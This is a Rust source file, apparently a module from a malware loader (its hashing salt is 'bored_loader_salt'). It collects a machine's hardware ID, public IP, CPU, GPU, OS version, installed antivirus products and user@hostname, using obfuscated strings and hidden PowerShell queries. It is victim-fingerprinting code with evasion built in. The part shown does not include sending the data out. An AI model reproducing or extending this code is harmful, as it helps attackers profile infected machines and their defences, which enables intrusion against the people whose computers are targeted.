use std::process::Command;
use serde::Serialize;
use sysinfo::{System, SystemExt, CpuExt};
use machineid_rs::{IdBuilder, Encryption, HWIDComponent};
use reqwest::blocking::get;
use whoami::fallible;
use obfstr::obfstr as s;

#[derive(Debug, Serialize)]
pub struct DeviceInfo {
    pub hwid: String,
    pub ip: String,
    pub cpu: String,
    pub gpu: String,
    pub os: String,
    pub av: String,
    pub user: String,
}

fn run_ps(cmd: &str) -> String {
    let output = Command::new(s!("powershell"))
        .args([s!("-NoProfile"), s!("-Command"), cmd])
        .output();

    match output {
        Ok(out) => {
            let result = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if result.is_empty() { s!("N/A").to_string() } else { result }
        }
        Err(_) => s!("Error").to_string(),
    }
}

pub fn collect_system_data() -> DeviceInfo {
    let mut sys = System::new_all();
    sys.refresh_all();

    let mut builder = IdBuilder::new(Encryption::SHA256);
    let hwid = builder
        .add_component(HWIDComponent::SystemID)
        .build(s!("bored_loader_salt"))
        .unwrap_or_else(|_| s!("Unknown_HWID").to_string());

    let ip = get(s!("https://api.ipify.org"))
        .and_then(|res| res.text())
        .unwrap_or_else(|_| s!("127.0.0.1").to_string());

    let cpu = sys.cpus().first()
        .map(|c| c.brand().to_string())
        .unwrap_or_else(|| s!("Unknown CPU").to_string());

    let gpu_cmd = String::from(s!("Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"));
    let gpu = run_ps(gpu_cmd.as_str());

    let os = format!(
        "{} {}",
        sys.name().unwrap_or_else(|| s!("Windows").to_string()),
        sys.os_version().unwrap_or_default()
    );

    let av_cmd = String::from(s!("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName"));
    let mut av = run_ps(av_cmd.as_str());
    if av == s!("N/A") || av == s!("Error") {
        av = s!("Windows Defender").to_string();
    }

    let username = whoami::username();
    let hostname = fallible::hostname().unwrap();
    let user_at_host = format!("{}@{}", username, hostname);

    DeviceInfo {
        hwid,
        ip,
        cpu,
        gpu,
        os,
        av,
        user: user_at_host,
    }
}